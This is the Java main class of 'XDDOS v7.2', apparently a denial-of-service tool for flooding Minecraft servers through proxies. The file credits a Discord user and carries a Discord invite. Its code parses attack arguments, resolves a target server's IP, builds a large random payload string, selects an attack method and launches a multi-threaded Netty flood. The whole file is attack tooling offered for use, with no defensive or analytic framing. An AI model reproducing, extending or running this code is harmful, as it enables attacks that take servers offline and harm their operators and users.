package XD.XDDOS;

import java.io.File;
import java.net.InetAddress;
import java.util.Arrays;
import java.util.Random;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.methods.Methods;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.helper.ArgsHelper;
import XD.XDDOS.utils.helper.ServerAddress;
import XD.XDDOS.utils.helper.Update;
import XD.XDDOS.utils.proxy.ProxyLoader;

public class XDDOS {

   public static File proxyFile;
   public static String origIP;
   public static String srvRecord;
   public static InetAddress resolved;
   public static int port;
   public static int protcolID;
   public static int protocolLength;
   public static String methodID;
   public static IMethod method;
   public static int duration;
   public static int nettyThreads;
   public static int loopThreads;
   public static String string;
   public static ProxyLoader proxies;
   public static String serverhp;
   public static final String DISCORD_USERNAME = "FatLinuxUser#5841";
   public static boolean attackRunning = false;

   public static String RED_BOLD = "\033[1;31m"; // RED
   public static String GREEN_BOLD = "\033[1;32m"; // GREEN
   public static String PURPLE_BOLD = "\033[1;35m"; // PURPLE
   public static String WHITE_BOLD = "\033[1;37m"; // WHITE
   public static String RESET = "\033[0m";
   public static String CYAN_BOLD = "\033[1;36m"; // CYAN_BOLD
   public static boolean x = false;

   public static void main(String[] args) throws Throwable {
      System.setProperty("file.encoding", "UTF-8");
      if (Arrays.toString(args).contains("-noansi")) {
         RED_BOLD = "";
         GREEN_BOLD = "";
         PURPLE_BOLD = "";
         WHITE_BOLD = "";
         RESET = "";
         CYAN_BOLD = "";
      }
      System.out.println();
      System.out.println();
      System.out.println(WHITE_BOLD +  "██╗  ██╗██████╗ ██████╗  ██████╗ ███████╗\n" +
                                       "╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n" +
                                       " ╚███╔╝ ██║  ██║██║  ██║██║   ██║███████╗\n" +
                                       " ██╔██╗ ██║  ██║██║  ██║██║   ██║╚════██║\n" +
                                       "██╔╝ ██╗██████╔╝██████╔╝╚██████╔╝███████║\n" +
                                       "╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n v7.2" +
                                       "\n" + RED_BOLD +
                                       "MADE BY: " + WHITE_BOLD + DISCORD_USERNAME + "\n" + WHITE_BOLD + "> " + PURPLE_BOLD +
                                       "DISCORD: " + GREEN_BOLD + "https://discord.gg/ZZCyuXuC2C\n" + WHITE_BOLD + "> " + WHITE_BOLD +
                                       "GitHub: " + RED_BOLD + "https://github.com/AnAverageBeing\n" + WHITE_BOLD +
                                       "Starting XDDOS :-\n" + RESET +
                                       "\n" + GREEN_BOLD +
                                       "STARTING\n" + RESET);


      if(args.length == 1) {
         if (args[0].toLowerCase().trim() == "-update") {
            Update.updateJAR();
         }
      }
         
      if (args.length < 6) {
         ArgsHelper.UserFrndly(args);
      } else {
         ArgsHelper.OneLine(args);
      }
   }

   public static void run() throws Throwable {
      if (!attackRunning) {
         attackRunning = true;
         try {
            if (XDDOS.protcolID > 758)
               x = true;
            System.out.println(
                  GREEN_BOLD + "[" + RED_BOLD + "XDDOS" + GREEN_BOLD + "]" + WHITE_BOLD + " Resolving Target IP...");
            ServerAddress sa = ServerAddress.getAddrss(serverhp);
            srvRecord = sa.getIP();
            port = sa.getPort();
            resolved = InetAddress.getByName(srvRecord);
            System.out.println(GREEN_BOLD + "[" + WHITE_BOLD + "Resolved IP:" + GREEN_BOLD + "]" + WHITE_BOLD + " "
                  + resolved.getHostAddress() + "\n" + RESET);
            origIP = serverhp.split(":")[0];
            protocolLength = protcolID > 128 ? 3 : 2;
            System.out.println("nettyThreads: " + nettyThreads + "\nloopThreads: " + loopThreads);
            Random r = new Random();
            for (int i = 1; i < 65536; ++i)
               string = string + (char) (r.nextInt(125) + 1);

         } catch (Exception var4) {
            var4.printStackTrace();
            Thread.sleep(5000L);
            return;
         }

         Methods.setupMethods();
         method = Methods.getMethod(methodID);
         System.out.println(GREEN_BOLD + "[" + WHITE_BOLD + "Running Method:" + GREEN_BOLD + "]" + WHITE_BOLD + " "
               + method.toString().split("@")[0] + "\n" + RESET);

         NettyBootstrap.start();
      }
   }
}
